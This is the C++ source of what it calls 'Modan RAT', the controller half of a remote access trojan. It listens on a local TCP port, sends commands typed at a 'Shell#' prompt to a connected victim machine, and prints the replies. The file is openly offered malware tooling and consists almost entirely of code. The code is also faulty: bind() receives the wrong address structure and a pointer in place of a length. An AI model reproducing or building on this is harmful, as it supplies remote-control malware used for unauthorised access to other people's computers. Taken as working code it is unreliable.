
/*

Name: Modan RAT
Version: 1.0
Discription: This is a Opensource CLI RAT
Github:
Author: Shah Jabir Taqi

*/

#include<iostream>   //standard input-output stream
#include<stdlib.h>   //functions involving memory allocation, process control, conversions and others
#include"unistd.h"   //Not have in Win x64, x84. provides access to the POSIX operating system API. It is defined by the POSIX.1 standard, the base of the Single Unix Specification, and should therefore be available in any POSIX-compliant operating system and compiler.
#include<WinSock2.h> //Network Drivers Prior to Windows Vista, Quality of Service(QOS), Windows Sockets 2
#include<Windows.h>  //Windows-specific header file for the C and C++ programming languages which contains declarations for all of the functions in the Windows API, all the common macros used by Windows programmers, and all the data types used by the various functions and subsystems.
#include<WinUser.h>  //Data Exchange, Desktop Window Manager(DWM), Developer Notes, Dialog Boxes, Display Devices Reference, High DPI, Input Feedback Configuration, Input Source Identification, Internationalization for Windows Applications, Keyboard and Mouse Input, Menus and Other Resources, Mobile Device Management Settings Provider, Pointer Device Input Stack, Pointer Input Messages and Notifications, Remote Desktop Services, Security and Identity, System Services,The Windows Shell, Touch Hit Testing, Touch Injection, Touch Input, Window Stations and Desktops, Windows Accessibility Features, Windows and Messages, Windows Controls, Windows GDI
#include<WinInet.h>  //Developer Notes, Windows Internet
#include<Windowsx.h> //Developer Notes, Windows and Messages, Windows Controls, Windows GDI
#include<string.h>   //required for string functions
#include<sys/stat.h> //the header in the C POSIX library for the C programming language that contains constructs that facilitate getting information about files attributes.
#include<sys/types.h>//The /usr/include/sys/types. h file defines data types used in system source code. Since some system data types are accessible to user code, they can be used to enhance portability across different machines and operating systems.
#include<ws2tcpip.h> //socklen_t or sys/socket.h alternative
#include<winsock2.h>
#include<Ws2ipdef.h>
#include<Ws2tcpip.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int main()
{
	int sock, client_socket;
	char buffer[1024];
	char response[18384];

	struct sockaddr_in server_address, client_address;
	int i = 0;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval))<0)
	{
		std::cout << "Error Setting TCP Socket Option!\n";
		return 1;
	}
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("127.0.0.1");
	server_address.sin_port = htons(5004);
	bind(sock, (struct sockaddr *) &client_address, &client_length);
	listen(sock, 5);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
	while (1)
	{
	jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		write(client_socket, buffer, sizeof(buffer));
		if (strncmp("q", buffer, 1) == 0) {
			break;
		}
		else {
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}

	}
}